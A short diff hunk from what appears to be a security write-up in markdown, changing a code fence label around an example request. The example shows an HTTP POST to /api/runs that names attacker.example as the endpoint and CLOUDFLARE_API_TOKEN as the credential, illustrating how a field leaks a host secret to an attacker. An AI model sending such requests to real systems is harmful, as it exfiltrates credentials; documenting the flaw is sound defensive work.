@@ -25,7 +25,7 @@ internet turns the same field into an arbitrary read of the host's
 secrets, delivered as a bearer token to whichever endpoint the same
 request named:
 
-```
+```http
 POST /api/runs
 {"target":{"endpoint":"https://attacker.example/mcp"},
  "credentials":{"token_env":"CLOUDFLARE_API_TOKEN"}}
